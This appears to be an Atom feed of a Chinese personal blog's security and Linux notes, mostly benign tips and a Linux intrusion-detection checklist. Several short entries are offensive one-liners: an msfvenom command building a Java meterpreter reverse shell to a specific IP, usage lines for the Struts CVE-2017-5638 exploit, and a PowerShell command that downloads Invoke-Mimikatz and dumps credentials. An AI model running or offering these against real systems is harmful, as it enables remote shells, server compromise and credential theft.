@@ -1,0 +1,337 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>0o0o0丶Blog</title>
+  
+  <subtitle>爱生活丶爱网络丶爱自由</subtitle>
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="https://10o0.github.io/"/>
+  <updated>2018-01-18T02:26:51.339Z</updated>
+  <id>https://10o0.github.io/</id>
+  
+  <author>
+    <name>0o0</name>
+    
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>msf_shell</title>
+    <link href="https://10o0.github.io/2018/01/18/msf-shell/"/>
+    <id>https://10o0.github.io/2018/01/18/msf-shell/</id>
+    <published>2018-01-18T02:22:16.000Z</published>
+    <updated>2018-01-18T02:26:51.339Z</updated>
+    
+    <content type="html"><![CDATA[<pre><code>java/meterpreter/reverse_tcpmsfvenom -p java/meterpreter/reverse_tcp  LHOST=203.101.160.157 LPORT=8808 -f jar -o msfserver.jar</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;pre&gt;&lt;code&gt;java/meterpreter/reverse_tcp
+
+msfvenom -p java/meterpreter/reverse_tcp  LHOST=203.101.160.157 LPORT=8808 -f jar -o msfserver.jar
+
+      
+    
+    </summary>
+    
+      <category term="笔记" scheme="https://10o0.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="msf" scheme="https://10o0.github.io/tags/msf/"/>
+    
+      <category term="shell" scheme="https://10o0.github.io/tags/shell/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>linux实用技巧</title>
+    <link href="https://10o0.github.io/2018/01/18/linux%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
+    <id>https://10o0.github.io/2018/01/18/linux实用技巧/</id>
+    <published>2018-01-18T01:56:49.000Z</published>
+    <updated>2018-01-18T02:18:41.361Z</updated>
+    
+    <content type="html"><![CDATA[<p>编辑 .bashrc 文件：</p><pre><code>root@kali:~# vim .bashrc root@kali:~# source .bashrc</code></pre><h2 id="自定义终端命令启动程序"><a href="#自定义终端命令启动程序" class="headerlink" title="自定义终端命令启动程序"></a>自定义终端命令启动程序</h2><p>exm：</p><pre><code>alias burp=&apos;setsid java -jar /root/softs/burpsuite_pro_v1.6.37.jar &gt;/dev/null 2&gt;&amp;1 &amp;&apos;</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;编辑 .bashrc 文件：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root@kali:~# vim .bashrc 
+root@kali:~# source .bashrc
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;自定义终端命令启动程序&quot;&gt;&lt;a href=&quot;#自定义终端命令启动
+      
+    
+    </summary>
+    
+      <category term="笔记" scheme="https://10o0.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="linux" scheme="https://10o0.github.io/tags/linux/"/>
+    
+      <category term="bash" scheme="https://10o0.github.io/tags/bash/"/>
+    
+      <category term="sh" scheme="https://10o0.github.io/tags/sh/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>linux入侵检测基础</title>
+    <link href="https://10o0.github.io/2018/01/18/linux%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E5%9F%BA%E7%A1%80/"/>
+    <id>https://10o0.github.io/2018/01/18/linux入侵检测基础/</id>
+    <published>2018-01-18T01:30:05.000Z</published>
+    <updated>2018-01-18T03:58:35.213Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="审计命令"><a href="#审计命令" class="headerlink" title="审计命令"></a>审计命令</h1><h2 id="last"><a href="#last" class="headerlink" title="last"></a>last</h2><blockquote><p>这个命令可用于查看我们系统的成功登录、关机、重启等情况，本质就是将/var/log/wtmp文件格式化输出，因此如果该文件被删除，则无法输出结果。</p></blockquote><pre><code>相关参数：last -10（-n） 查看最近10条记录last -x reboot 查看重启的记录last -x shutdown 查看关机的记录last -d 查看登陆的记录last –help 命令帮助信息last -f wtmp 用last命令查看wtmp文件（直接打开无法查看）</code></pre><a id="more"></a><h2 id="lastb"><a href="#lastb" class="headerlink" title="lastb"></a>lastb</h2><blockquote><p>这个命令用于查看登录失败的情况，本质就是将/var/log/btmp文件格式化输出。</p></blockquote><pre><code>相关参数：lastb name（root） 查看root用户登陆失败记录lastb -10（-n） 查看最近10条登陆失败记录lastb –heplp 命令帮助信息</code></pre><h2 id="lastlog"><a href="#lastlog" class="headerlink" title="lastlog"></a>lastlog</h2><blockquote><p>这个命令用于查看用户上一次的登录情况，本质就是将/var/log/lastlog文件格式化输出。</p></blockquote><pre><code>相关参数：lastlog 所有用户上一次登陆记录lastlog -u username（root） root用户上一次登陆记录lastlog –help 命令帮助信息</code></pre><h2 id="who"><a href="#who" class="headerlink" title="who"></a>who</h2><blockquote><p>这个命令用户查看当前登录系统的情况，本质就是将/var/log/utmp文件格式化输出。主要用来查看当前用户名称，以及登陆的ip地址信息，w命令与who一样，会更详细一些。</p><h2 id="history"><a href="#history" class="headerlink" title="history"></a>history</h2><p>查看历史命令记录，其实就是查看root/.bash_history文件内容，删除这个文件，记录就没了。</p></blockquote><pre><code>相关参数：history 查看所有历史记录history -10 查看最近10条记录history | grep “wget” 查看wget相关信息的记录history –help 命令帮助信息</code></pre><blockquote><p>history显示时间戳：</p></blockquote><p><code>export HISTTIMEFORMAT=&quot;%F %T</code>whoami<code>&quot;history | more</code></p><h1 id="检查用户"><a href="#检查用户" class="headerlink" title="检查用户"></a>检查用户</h1><blockquote><p>Linux不同的用户，有不同的操作权限，但是所有用户都会在/etc/passwd、/etc/shadow、/etc/group文件中记录。</p></blockquote><pre><code>less /etc/passwd　　查看是否有新增用户grep :0 /etc/passwd　　查看是否有特权用户（root权限用户）ls -l /etc/passwd　　查看passwd最后修改时间</code></pre><p><code>cawk -F: &#39;$3==0 {print $1}&#39; /etc/passwd　　查看是否存在特权用户</code></p><p><code>awk -F: &#39;length($2)==0 {print $1}&#39; /etc/shadow　　查看是否存在空口令用户</code></p><blockquote><p>注：linux设置空口令：<code>passwd -d username</code></p></blockquote><h1 id="检查进程"><a href="#检查进程" class="headerlink" title="检查进程"></a>检查进程</h1><blockquote><p>一般被入侵的服务器都会运行一些恶意程序，或是挖矿程序，或者DDOS程序等等，如果程序运行着，那么通过查看进程可以发现一些信息。</p></blockquote><h2 id="普通进程"><a href="#普通进程" class="headerlink" title="普通进程"></a>普通进程</h2><pre><code>ps -aux　　查看进程top查看进程lsof -p pid　　查看进程所打开的端口及文件lsof -c 进程名　　查看关联文件ps -aux | grep python | cut -d &apos; &apos; -f 2 | xargs kill   杀死python相关的进程</code></pre><blockquote><p>检查/etc/inetd.conf文件，输入：<code>cat /etc/inetd.conf | grep –v &quot;^#&quot;</code>，输出的信息就是你这台机器所开启的远程服务。</p></blockquote><h2 id="隐藏进程"><a href="#隐藏进程" class="headerlink" title="隐藏进程"></a>隐藏进程</h2><pre><code>ps -ef | awk &apos;{print}&apos; | sort -n | uniq &gt;1  ls /proc | sort -n |uniq &gt;2diff 1 2</code></pre><h1 id="检查文件"><a href="#检查文件" class="headerlink" title="检查文件"></a>检查文件</h1><blockquote><p>被入侵的网站，通常肯定有文件被改动，那么可以通过比较文件创建时间、完整性、文件路径等方式查看文件是否被改动。</p></blockquote><pre><code>find / -uid 0 -print　　查找特权用户文件find / -size +10000k -print　　查找大于10000k的文件find / -name &quot;…&quot; -prin　　查找用户名为…的文件find / -name core -exec ls -l {} \;　　查找core文件，并列出详细信息md5sum -b filename　　查看文件的md5值rpm -qf /bin/ls　　检查文件的完整性（还有其它/bin目录下的文件）whereis 文件名　　查看文件路径ls -al 文件名　　查看文件创建时间du -sh  文件名   查看文件大小</code></pre><h1 id="检查网络"><a href="#检查网络" class="headerlink" title="检查网络"></a>检查网络</h1><blockquote><p>检查网络的目的，是查看黑客是否通过篡改网卡类型，进行流量嗅探等操作。</p></blockquote><pre><code>ip link | grep PROMISC　　正常网卡不应该存在promisc，如果存在可能有snifferlsof -inetstat -nap　　查看不正常端口arp -a　　查看arp记录是否正常ifconfig -a　　查看网卡设置</code></pre><h1 id="检查计划任务"><a href="#检查计划任务" class="headerlink" title="检查计划任务"></a>检查计划任务</h1><blockquote><p>当我们尝试kill恶意程序时，往往会遇到被kill程序自动启动的问题，那么就要检查下计划任务(cron)了。</p></blockquote><pre><code>crontab -u root -l　　查看root用户的计划任务cat /etc/crontabls -l /etc/cron.*　　查看cron文件是否变化的详细信息ls /var/spool/cron/</code></pre><h1 id="检查系统后门"><a href="#检查系统后门" class="headerlink" title="检查系统后门"></a>检查系统后门</h1><blockquote><p>可以使用工具，如：Conmodo、rkhunter等，当然也可以手工输入命令检查。</p></blockquote><pre><code>vim $HOME/.ssh/authorized_keys　　查看ssh永久链接文件lsmod　　检查内核模块chkconfig –list/systemctl list-units –type=service　　检查自启</code></pre><blockquote><p>查看著名的木门后门程序：</p></blockquote><pre><code>ls /etc/rc.d   #系统开机后，此目录下的文件会被启动ls /etc/rc3.dfind / -name “.rhosts” –printfind / -name “.forward” –print</code></pre><h1 id="打包文件"><a href="#打包文件" class="headerlink" title="打包文件"></a>打包文件</h1><blockquote><p>当我们做好一切入侵检测分析后，我们需要把一些日志文件copy到本地进行更进一步详细的分析时，怎么打包服务器相关信息，并且copy到本地呢？</p></blockquote><h2 id="打包web文件"><a href="#打包web文件" class="headerlink" title="打包web文件"></a>打包web文件</h2><p>打包文件名中包含jsp的文件，打包后的文件为my_txt_files.tar：<br>tar cvf my_txt_files.tar <code>find . -type f -name &quot;*.jsp*&quot;</code></p><h2 id="打包日志文件"><a href="#打包日志文件" class="headerlink" title="打包日志文件"></a>打包日志文件</h2><pre><code>tar -cvf log.tar /var/log</code></pre><h2 id="打包其他信息"><a href="#打包其他信息" class="headerlink" title="打包其他信息"></a>打包其他信息</h2><pre><code>last &gt; last.lognetstat -an &gt; netstat.log</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;审计命令&quot;&gt;&lt;a href=&quot;#审计命令&quot; class=&quot;headerlink&quot; title=&quot;审计命令&quot;&gt;&lt;/a&gt;审计命令&lt;/h1&gt;&lt;h2 id=&quot;last&quot;&gt;&lt;a href=&quot;#last&quot; class=&quot;headerlink&quot; title=&quot;last&quot;&gt;&lt;/a&gt;last&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;这个命令可用于查看我们系统的成功登录、关机、重启等情况，本质就是将/var/log/wtmp文件格式化输出，因此如果该文件被删除，则无法输出结果。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;pre&gt;&lt;code&gt;相关参数：
+
+last -10（-n） 查看最近10条记录
+last -x reboot 查看重启的记录
+last -x shutdown 查看关机的记录
+last -d 查看登陆的记录
+last –help 命令帮助信息
+last -f wtmp 用last命令查看wtmp文件（直接打开无法查看）
+&lt;/code&gt;&lt;/pre&gt;
+    
+    </summary>
+    
+      <category term="笔记" scheme="https://10o0.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="linux" scheme="https://10o0.github.io/tags/linux/"/>
+    
+      <category term="入侵检测，安全审计" scheme="https://10o0.github.io/tags/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%EF%BC%8C%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>kali安装NVIDIA显卡驱动</title>
+    <link href="https://10o0.github.io/2018/01/10/kali%E5%AE%89%E8%A3%85NVIDIA%E6%98%BE%E5%8D%A1%E9%A9%B1%E5%8A%A8/"/>
+    <id>https://10o0.github.io/2018/01/10/kali安装NVIDIA显卡驱动/</id>
+    <published>2018-01-10T01:32:48.000Z</published>
+    <updated>2018-01-10T02:17:05.586Z</updated>
+    
+    <content type="html"><![CDATA[<p>安装参考链接<br><a href="https://forums.kali.org/showthread.php?35748-TUTORIAL-Installing-official-NVIDIA-driver-in-Optimus-laptop" target="_blank" rel="noopener">https://forums.kali.org/showthread.php?35748-TUTORIAL-Installing-official-NVIDIA-driver-in-Optimus-laptop</a><br>验证：<br><a href="https://docs.kali.org/general-use/install-nvidia-drivers-on-kali-linux" target="_blank" rel="noopener">https://docs.kali.org/general-use/install-nvidia-drivers-on-kali-linux</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;安装参考链接&lt;br&gt;&lt;a href=&quot;https://forums.kali.org/showthread.php?35748-TUTORIAL-Installing-official-NVIDIA-driver-in-Optimus-laptop&quot; target=&quot;_bl
+      
+    
+    </summary>
+    
+      <category term="笔记" scheme="https://10o0.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="kali" scheme="https://10o0.github.io/tags/kali/"/>
+    
+      <category term="NVIDIA" scheme="https://10o0.github.io/tags/NVIDIA/"/>
+    
+      <category term="驱动" scheme="https://10o0.github.io/tags/%E9%A9%B1%E5%8A%A8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>s2-045 exp CVE-2017-5638</title>
+    <link href="https://10o0.github.io/2017/03/16/s2-045-exp-CVE-2017-5638/"/>
+    <id>https://10o0.github.io/2017/03/16/s2-045-exp-CVE-2017-5638/</id>
+    <published>2017-03-16T03:30:23.000Z</published>
+    <updated>2017-03-16T03:51:09.905Z</updated>
+    
+    <content type="html"><![CDATA[<p>Usage:</p><p>Testing a single URL.</p><pre><code>python struts-pwn.py --url &apos;http://example.com/struts2-showcase/index.action&apos; -c &apos;id&apos;</code></pre><p>Testing a list of URLs.</p><pre><code>python struts-pwn.py --list &apos;urls.txt&apos; -c &apos;id&apos;</code></pre><p>Checking if the vulnerability exists against a single URL.</p><pre><code>python struts-pwn.py --check --url &apos;http://example.com/struts2-showcase/index.action&apos;</code></pre><p>Checking if the vulnerability exists against a list of URLs.</p><pre><code>python struts-pwn.py --check --list &apos;urls.txt&apos;</code></pre><p>Requirements</p><pre><code>Python2 or Python3requests</code></pre><p><a href="https://github.com/mazen160/struts-pwn/blob/master/struts-pwn.py" title="s2-045" target="_blank" rel="noopener">https://github.com/mazen160/struts-pwn/blob/master/struts-pwn.py</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;Usage:&lt;/p&gt;
+&lt;p&gt;Testing a single URL.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;python struts-pwn.py --url &amp;apos;http://example.com/struts2-showcase/index.action&amp;apos
+      
+    
+    </summary>
+    
+      <category term="exploit" scheme="https://10o0.github.io/categories/exploit/"/>
+    
+    
+      <category term="s2-045" scheme="https://10o0.github.io/tags/s2-045/"/>
+    
+      <category term="exp" scheme="https://10o0.github.io/tags/exp/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Python command</title>
+    <link href="https://10o0.github.io/2017/03/06/Python-command/"/>
+    <id>https://10o0.github.io/2017/03/06/Python-command/</id>
+    <published>2017-03-06T08:02:34.000Z</published>
+    <updated>2017-03-06T08:06:41.501Z</updated>
+    
+    <content type="html"><![CDATA[<p>python:</p><pre><code>py -2 hello.pypy -3 hello.py</code></pre><p>pip</p><pre><code>py -2 -m pip install XXXXpy -3 -m pip install XXXX</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;python:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;py -2 hello.py
+
+py -3 hello.py
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;pip&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;py -2 -m pip install XXXX
+
+py -3 -m pip install 
+      
+    
+    </summary>
+    
+      <category term="笔记" scheme="https://10o0.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="python" scheme="https://10o0.github.io/tags/python/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>SimpleHTTPServer</title>
+    <link href="https://10o0.github.io/2017/03/05/SimpleHTTPServer/"/>
+    <id>https://10o0.github.io/2017/03/05/SimpleHTTPServer/</id>
+    <published>2017-03-05T02:18:03.000Z</published>
+    <updated>2017-03-06T08:11:04.402Z</updated>
+    
+    <content type="html"><![CDATA[<pre><code>python -m SimpleHTTPServer 8080 #端口可自定义</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;pre&gt;&lt;code&gt;python -m SimpleHTTPServer 8080 #端口可自定义
+&lt;/code&gt;&lt;/pre&gt;
+      
+    
+    </summary>
+    
+      <category term="笔记" scheme="https://10o0.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="command" scheme="https://10o0.github.io/tags/command/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>win10-Cmd here</title>
+    <link href="https://10o0.github.io/2017/03/04/win10-Cmd-here/"/>
+    <id>https://10o0.github.io/2017/03/04/win10-Cmd-here/</id>
+    <published>2017-03-04T08:27:02.000Z</published>
+    <updated>2018-01-18T02:25:55.111Z</updated>
+    
+    <content type="html"><![CDATA[<p>保存为reg格式导入注册表即可：</p><pre><code>Windows Registry Editor Version 5.00[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\background\shell\cmd_here]@=&quot;Cmd Here&quot;[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\background\shell\cmd_here\command]@=&quot;\&quot;C:\\Windows\\System32\\cmd.exe\&quot;&quot;[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Folder\shell\cmdPrompt]@=&quot;Cmd Here&quot;[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Folder\shell\cmdPrompt\command]@=&quot;\&quot;C:\\Windows\\System32\\cmd.exe\&quot; \&quot;cd %1\&quot;&quot;[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\shell\cmd_here]@=&quot;Cmd Here&quot;[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\shell\cmd_here\command]@=&quot;\&quot;C:\\Windows\\System32\\cmd.exe\&quot;&quot;</code></pre><p><img src="http://i.imgur.com/wZijEcJ.jpg" alt=""></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;保存为reg格式导入注册表即可：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Windows Registry Editor Version 5.00
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\background\shell\cmd
+      
+    
+    </summary>
+    
+      <category term="笔记" scheme="https://10o0.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="cmd" scheme="https://10o0.github.io/tags/cmd/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>hexo command</title>
+    <link href="https://10o0.github.io/2017/03/02/hexo-command/"/>
+    <id>https://10o0.github.io/2017/03/02/hexo-command/</id>
+    <published>2017-03-02T08:46:11.000Z</published>
+    <updated>2018-01-18T04:03:44.205Z</updated>
+    
+    <content type="html"><![CDATA[<pre><code>hexo new &quot;postName&quot; #新建文章hexo new page &quot;pageName&quot; #新建页面hexo generate #生成静态页面至public目录hexo server #开启预览访问端口（默认端口4000，&apos;ctrl + c&apos;关闭server）hexo deploy #将.deploy目录部署到GitHub</code></pre><hr><pre><code>hexo cleanhexo generate --deploy</code></pre><hr><a id="more"></a>]]></content>
+    
+    <summary type="html">
+    
+      &lt;pre&gt;&lt;code&gt;hexo new &amp;quot;postName&amp;quot; #新建文章
+hexo new page &amp;quot;pageName&amp;quot; #新建页面
+hexo generate #生成静态页面至public目录
+hexo server #开启预览访问端口（默认端口4000，&amp;apos;ctrl + c&amp;apos;关闭server）
+hexo deploy #将.deploy目录部署到GitHub
+&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
+&lt;pre&gt;&lt;code&gt;hexo clean
+hexo generate --deploy
+&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
+    
+    </summary>
+    
+      <category term="笔记" scheme="https://10o0.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="hexo" scheme="https://10o0.github.io/tags/hexo/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>mimikittenz-Ps1版</title>
+    <link href="https://10o0.github.io/2017/03/01/mimikittenz-Ps1%E7%89%88/"/>
+    <id>https://10o0.github.io/2017/03/01/mimikittenz-Ps1版/</id>
+    <published>2017-03-01T10:25:20.000Z</published>
+    <updated>2017-03-03T05:50:41.691Z</updated>
+    
+    <content type="html"><![CDATA[<p>powershell “IEX (New-Object Net.WebClient).DownloadString(‘<a href="https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1" target="_blank" rel="noopener">https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1</a>‘); Invoke-Mimikatz -DumpCreds”</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;powershell “IEX (New-Object Net.WebClient).DownloadString(‘&lt;a href=&quot;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/E
+      
+    
+    </summary>
+    
+      <category term="提权" scheme="https://10o0.github.io/categories/%E6%8F%90%E6%9D%83/"/>
+    
+    
+      <category term="mimikittenz" scheme="https://10o0.github.io/tags/mimikittenz/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>0o0-test</title>
+    <link href="https://10o0.github.io/2017/03/01/0o0-test/"/>
+    <id>https://10o0.github.io/2017/03/01/0o0-test/</id>
+    <published>2017-03-01T06:25:31.000Z</published>
+    <updated>2018-01-10T02:47:30.065Z</updated>
+    
+    <content type="html"><![CDATA[<p>测试文章–test—0o0~！！！！！！</p><p>hexo new “postName” #新建文章<br>hexo new page “pageName” #新建页面<br>hexo generate #生成静态页面至public目录<br>hexo server #开启预览访问端口（默认端口4000，’ctrl + c’关闭server）<br>hexo deploy #将.deploy目录部署到GitHub</p><p>hexo new [layout] <title><br>hexo new photo “My Gallery”<br>hexo new “Hello World” –lang tw</title></p><p>title: 使用Hexo搭建个人博客<br>layout: post<br>date: 2014-03-03 19:07:43<br>comments: true<br>categories: Blog<br>tags: [Hexo]<br>keywords: Hexo, Blog<br>description: 生命在于折腾，又把博客折腾到Hexo了。给Hexo点赞。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;测试文章–test—0o0~！！！！！！&lt;/p&gt;
+&lt;p&gt;hexo new “postName” #新建文章&lt;br&gt;hexo new page “pageName” #新建页面&lt;br&gt;hexo generate #生成静态页面至public目录&lt;br&gt;hexo server 
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+</feed>
